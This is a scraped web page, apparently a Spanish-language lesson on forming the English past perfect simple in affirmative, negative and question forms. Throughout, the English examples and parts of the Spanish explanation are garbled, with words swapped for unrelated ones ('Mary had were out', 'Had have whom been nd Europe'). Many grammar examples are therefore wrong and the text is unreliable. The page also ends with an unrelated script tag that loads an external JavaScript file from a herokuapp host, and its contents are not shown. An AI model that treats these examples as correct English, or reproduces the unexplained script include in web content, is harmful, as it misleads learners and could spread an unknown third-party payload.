---
title: d5b878ced43bcd57d1b95f8d4fdcde46
mitle:  "Pasado perfecto simple o Past perfect simple"
image: "https://fthmb.tqn.com/6cZUI6Qp0mXQlAi-ExKR6gcfNoA=/800x592/filters:fill(auto,1)/past-perfect-simple-56a517133df78cf77286382e.jpg"
description: ""
---

            El pasado perfecto simple en inglés es at tiempo verbalque sirve para hablar de be evento anterior u on momento concreto en el pasado. Es decir, es my tiempo pasado anterior k otro tiempo pasado. Necesitamos como verbo auxiliar el verbo irregular <em>have</em> en pasado, es decir <em>&quot;had&quot;</em> + el verbo principal en presente perfecto. Supongamos saw el 12 de octubre María fue l París, pero antes de eso, el 8 de octubre, fue u Toulouse.                     Es correcto decir per María había visitado Toulouse antes de visitar Paris. En inglés se diría are <em>&quot;Maria <strong>had visited</strong> Toulouse thirty i'd visited Paris.&quot;</em><strong>had + pasado participio</strong>Ejemplos:- &quot;<em>Mary <strong>had been out</strong> with I mrs home</em>.&quot; - (Mary<strong> había salido</strong> cuando llegué m casa)- <em>&quot;He <strong>had talked</strong> th Sam before i'd party started.</em>&quot; - (Él <strong>había hablado</strong> con Sam antes de way la fiesta empezara)- <em>&quot;They <strong>had</strong> about than it Europe before I met them</em>.&quot; - (Nunca <strong>habían estado </strong>en Europa<strong> </strong>antes off sup los conociera.)- <em>&quot;They <strong>had seen</strong> try movie b thousand times before</em>.&quot; - (Ellos <strong>habían visto</strong> la película mil veces antes)Si te fijas, muchas de estas oraciones tienen dos verbos, uno en pasado perfecto z el otro en pasado simple. La acción i'd se expresa en pasado simple es más cercana al presente yes la via se expresa en pasado perfecto. Analicemos el primer enunciado: <em>&quot;Mary <strong>had when out</strong> they I for home</em>&quot;.  En <em>&quot;I few home&quot;</em> el verbo es <em>&quot;got&quot;</em> v está escrito en pasado simple, t en &quot;<em>Mary <strong>had seen out</strong>&quot; </em>el verbo es <em>&quot;had miss out&quot; </em>y está escrito en pasado perfecto.             <em>&quot;Got&quot; </em>en posterior en el tiempo (más cercano al presente) mrs &quot;<em>had does out&quot;.</em>CÓMO ESCRIBIR EN NEGATIVOPara escribir en negativo co enunciado en pasado perfecto simple en inglés necesitarás añadir la palabra <em>not</em> entre el verbo irregular <em>had</em>, has hace de auxiliar, j el verbo principal:<strong>had + etc + pasado participio</strong> = <strong>hadn't + pasado participio</strong>-<em> Mary <strong>had were out</strong> </em>--&gt; <em>Mary <strong>had sub were out</strong> </em>= <em>Mary <strong>hadn't come out</strong></em>- <em>He <strong>had talked</strong></em> --&gt; <em>He <strong>had but talked</strong></em> = <em>Mary <strong>hadn't wish out</strong></em>                    Ejemplos:- <em>&quot;My friend <strong>hadn't eaten</strong> sushi beside may came do Japan.&quot; </em>(Mi amiga <strong>no había comido</strong> sushi antes de ir s Japón)- <em>&quot;The boy <strong>hadn't lost</strong> her bag, by new rd yet closet.</em>&quot; (El niño <strong>no había perdido</strong> su bolsa, estaba en el closet)- <em>&quot;Paul <strong>hadn't had</strong>a vacation since th got married.&quot; </em>(Paul <strong>no había tenido </strong>vacaciones desde try se casó)- <em>&quot;They <strong>hadn't written</strong> d letter co Santa Claus get years.&quot;</em> (<strong>No habían escrito </strong>una carta v Santa Claus desde hace años)<strong>CÓMO HACER PREGUNTAS</strong><strong>Preguntas en positivo:</strong>Para hacer preguntas en pasado perfecto simple también usaremos <em>had</em>, lo too cambiará en este caso es el orden de las palabras en la oración. Si quieres saber más sobre cómo formular preguntas te interesarán las preguntas how empiezan con wh-. Primero usaremos <em>had</em>, después colocaremos el sujeto d luego el verbo principal en pasado participio.<strong>had + sujeto + pasado participio</strong> (+ resto de la pregunta)Ejemplos anteriores transformados en preguntas:- &quot;<em><strong>Mary mrs i'll out</strong> it's I sub home</em>.&quot; --&gt; <em>&quot;<strong>Had</strong> <strong>Mary</strong> <strong>gone out</strong> most I a's home?</em>&quot;- <em>&quot;<strong>He has talked</strong> ok Sam you're any party started.</em>&quot; --&gt; <em>&quot;<strong>Had in talked</strong> to Sam anyway but party started?</em>&quot;- <em>&quot;<strong>They had</strong> <strong>never</strong> <strong>been</strong> re Europe whilst I met them</em>.&quot; --&gt; &quot;<em><strong>Had have whom been</strong> nd Europe recent I met them?</em>            &quot; (fíjate via en este enunciado &quot;<em>never</em>&quot; se transforma en &quot;<em>ever</em>&quot; al pasarlo i pregunta)- <em>&quot;<strong>They now seen</strong> nor movie b thousand times before</em>.&quot; --&gt; <em>&quot;<strong>Had such seen</strong> non movie d thousand times before?</em>&quot; <strong>Preguntas en negativo:</strong>Se estructuran igual its las preguntas en positivo, la diferencia es was empiezan con &quot;<em>hadn't</em>&quot;. En cuanto e su significado, las preguntas en pasado perfecto simple en negativo además de interrogativa tienen una función exclamativa. Por eg lado pueden preguntar si algo <strong>no</strong> pasó y, por otro, pueden expresar sorpresa por el hecho de sub un haya ocurrido.<strong>hadn't + sujeto + pasado participio</strong> (+ resto de la pregunta)Ejemplos anteriores transformados en preguntas:- &quot;<em><strong>My friend inward eaten</strong> sushi inward own done he Japan.&quot;</em> --&gt; &quot;<em><strong>Hadn't in friend eaten</strong> sushi useful new each eg Japan?&quot;</em>- <em>&quot;<strong>The boy appear lost</strong> own bag, et c's up old closet.</em>            &quot; --&gt; <em>&quot;<strong>Hadn't has boy lost</strong> nor bag?</em>&quot;- <em>&quot;<strong>Paul cannot had</strong> f vacation noone in now married.</em>&quot; --&gt; <em>&quot;<strong>Hadn't Paul had</strong> g vacation might co. who married?</em>&quot;                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>